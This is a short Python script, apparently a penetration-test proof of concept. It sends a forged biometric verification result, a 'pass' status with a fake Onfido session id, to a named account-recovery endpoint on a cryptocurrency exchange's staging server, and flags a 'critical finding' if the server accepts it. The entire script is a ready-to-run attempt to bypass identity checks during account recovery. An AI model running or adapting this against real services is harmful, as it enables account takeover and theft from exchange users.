import requests
import json

TARGET_URL = "https://staging.luno.com/api/v1/recovery/verify_biometric"
HEADERS = {
    "Authorization": "Bearer YOUR_TOKEN_HERE",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0"
}

payload = {
    "user_id": "YOUR_USER_ID_HERE",
    "onfido_session_id": "fake_session_12345",
    "biometric_status": "pass",
    "geo_location": {"lat": 3.1390, "lng": 101.6869}
}

print("[*] Sending request...")
try:
    response = requests.post(TARGET_URL, headers=HEADERS, json=payload)
    print(f"[*] Status Code: {response.status_code}")
    print(f"[*] Response: {response.text}")
    
    if response.status_code == 200 and "success" in response.text.lower():
        print("[!] CRITICAL FINDING: Server accepted manipulated status!")
    else:
        print("[*] Server rejected the payload.")
except Exception as e:
    print(f"[!] Error: {e}")
